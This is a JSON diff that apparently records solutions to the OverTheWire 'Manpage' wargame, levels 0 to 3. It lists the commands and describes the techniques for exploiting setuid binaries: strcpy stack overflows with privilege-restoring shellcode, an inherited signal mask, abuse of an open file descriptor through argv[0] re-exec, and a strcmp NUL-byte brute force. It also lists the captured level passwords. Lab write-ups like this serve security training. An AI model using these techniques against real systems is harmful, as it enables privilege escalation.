@@ -1,1 +1,82 @@
-{"goals":{"0":"Overflow the strcpy in the setuid /manpage/manpage0 binary and recover manpage1's privileges via the saved set-user-ID to read its password file."},"host":"manpage.labs.overthewire.org","levels":[{"cmds":[["cat /manpage/manpage0.c","# setuid binary: setuid(getuid()); strcpy(buf[256], argv[1]) — classic overflow, saved set-user-ID still holds manpage1","gdb /manpage/manpage0   # find buf on the stack; EIP offset = 260 (ASLR off, stack executable)","python3 exp0.py   # payload: NOP sled + setresuid(17001,17001,17001) + execve(\"/bin/sh\") shellcode, ret addr into buf","id","cat /etc/manpage_pass/manpage1"]],"lvl":0,"out":["uid=17001(manpage1) gid=17000(manpage0) groups=17000(manpage0)","Mu8GvMudHb"],"pw":"Mu8GvMudHb","user":"manpage0"}],"title":"Manpage"}
+{
+ "goals": {
+  "0": "Overflow the strcpy in the setuid /manpage/manpage0 binary and recover manpage1's privileges via the saved set-user-ID to read its password file.",
+  "1": "Overflow strcpy in /manpage/manpage1 despite its strlen check that raises SIGTERM after the copy.",
+  "2": "Defeat the getpass checker in /manpage/manpage2, abusing its argv[0] re-exec and an inherited open password-file descriptor.",
+  "3": "Match a 256-byte random password compared with strcmp in /manpage/manpage3, exploiting strcmp's stop-at-NUL semantics."
+ },
+ "host": "manpage.labs.overthewire.org",
+ "levels": [
+  {
+   "cmds": [
+    [
+     "cat /manpage/manpage0.c",
+     "# setuid binary: setuid(getuid()); strcpy(buf[256], argv[1]) \u2014 classic overflow, saved set-user-ID still holds manpage1",
+     "gdb /manpage/manpage0   # find buf on the stack; EIP offset = 260 (ASLR off, stack executable)",
+     "python3 exp0.py   # payload: NOP sled + setresuid(17001,17001,17001) + execve(\"/bin/sh\") shellcode, ret addr into buf",
+     "id",
+     "cat /etc/manpage_pass/manpage1"
+    ]
+   ],
+   "lvl": 0,
+   "out": [
+    "uid=17001(manpage1) gid=17000(manpage0) groups=17000(manpage0)",
+    "Mu8GvMudHb"
+   ],
+   "pw": "Mu8GvMudHb",
+   "user": "manpage0"
+  },
+  {
+   "cmds": [
+    [
+     "cat /manpage/manpage1.c",
+     "# same strcpy overflow, but strlen(buf)>=255 -> raise(SIGTERM) after the copy",
+     "python3 exp1b.py",
+     "# parent blocks SIGTERM (inherited mask -> raise() never delivers); overflow to setresuid(17002)+execve(\"/bin/cat\", \"/etc/manpage_pass/manpage2\") shellcode"
+    ]
+   ],
+   "lvl": 1,
+   "out": [
+    "m2uPltjqCJ"
+   ],
+   "pw": "m2uPltjqCJ",
+   "user": "manpage1"
+  },
+  {
+   "cmds": [
+    [
+     "cat /manpage/manpage2.c",
+     "# getpass check vs file, then setuid(getuid()) and execl(argv[0], argv[0], argv[1]) with argv[1][0] as a counter",
+     "python3 exp2d.py",
+     "# launch with executable=/manpage/manpage2 but argv[0]=\"/bin/sh\", argv[1]=\"\\x81\"; plant a script file named byte 0x82 in cwd",
+     "# after one wrong guess the binary execs /bin/sh \"\\x82\" -> our script: lseek(fd3,0,0) + read -> the still-open password FILE* from the privileged run"
+    ]
+   ],
+   "lvl": 2,
+   "out": [
+    "FD3: b'A8CLKp6IDp\\n'"
+   ],
+   "pw": "A8CLKp6IDp",
+   "user": "manpage2"
+  },
+  {
+   "cmds": [
+    [
+     "cat /manpage/manpage3.c",
+     "# strcmp(stdin_line, 256 random bytes from /manpage/manpage3-pw/password); /manpage/manpage3-reset regenerates it from /dev/urandom",
+     "python3 exp3b.py",
+     "# loop: reset, then guess a line starting with a NUL byte; strcmp matches when the random file starts with 0x00 (1/256)",
+     "cat /etc/manpage_pass/manpage4   # inside the won shell, fed after a delay"
+    ]
+   ],
+   "lvl": 3,
+   "out": [
+    "Wow, you should play the lottery!",
+    "8O96CWQPaN"
+   ],
+   "pw": "8O96CWQPaN",
+   "user": "manpage3"
+  }
+ ],
+ "title": "Manpage"
+}
